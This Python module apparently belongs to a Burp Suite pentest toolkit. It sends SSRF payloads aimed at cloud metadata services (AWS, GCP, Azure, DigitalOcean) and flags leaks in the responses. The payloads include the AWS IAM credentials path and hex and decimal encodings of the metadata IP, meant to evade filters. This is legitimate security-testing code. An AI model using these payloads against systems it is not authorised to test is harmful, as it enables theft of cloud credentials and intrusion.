"""Edge-case test: test_cloud_metadata."""

import asyncio
import base64
import json
import time
import uuid

from burpsuite_mcp import client

async def test_cloud_metadata_impl(
    session: str,
    parameter: str = "url",
    path: str = "/",
    injection_point: str = "query",
) -> str:
    """Test SSRF to cloud metadata services (AWS, GCP, Azure, DigitalOcean).

    Args:
        session: Session name
        parameter: Parameter to inject SSRF payload into
        path: Endpoint path
        injection_point: Where to inject: 'query' or 'body'
    """
    metadata_endpoints = [
        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
        # Each indicator must be specific enough that it's extremely unlikely to
        # appear in a non-metadata response. Weak generic words like "hostname",
        # "network", "compute", "instance" are rejected — they match documentation
        # pages, API listings, and any page mentioning servers.
        ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
        ("AWS Hex IP", "http://0xA9FEA9FE/latest/meta-data/", ["ami-id", "instance-id"]),
        ("AWS Decimal IP", "http://2852039166/latest/meta-data/", ["ami-id", "instance-id"]),
        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", ["project-id", "service-accounts/default"]),
        ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id"]),
    ]

    lines = [f"Cloud Metadata SSRF Test: {parameter} on {path}\n"]
    vulns = []

    for name, url, indicators in metadata_endpoints:
        inject_path = f"{path}?{parameter}={url}" if injection_point == "query" else path
        req = {"session": session, "method": "GET", "path": inject_path}
        if injection_point == "body":
            req["method"] = "POST"
            req["data"] = f"{parameter}={url}"

        resp = await client.post("/api/session/request", json=req)
        if "error" in resp:
            lines.append(f"  [{name}] Error")
            continue

        body = resp.get("response_body", "")
        status = resp.get("status", 0)
        matched = [i for i in indicators if i.lower() in body.lower()]

        if matched:
            vulns.append(f"CRITICAL: {name} — metadata leaked ({', '.join(matched)})")
            lines.append(f"  [{name}] VULNERABLE — {', '.join(matched)} found in response")
        elif status == 200 and len(body) > 100:
            lines.append(f"  [{name}] Possible — 200 OK, {len(body)}B response (review manually)")
        else:
            lines.append(f"  [{name}] Not vulnerable ({status})")

    if vulns:
        lines.append(f"\n*** {len(vulns)} CLOUD METADATA LEAKS ***")
    else:
        lines.append(f"\nNo cloud metadata exposure detected.")

    return "\n".join(lines)
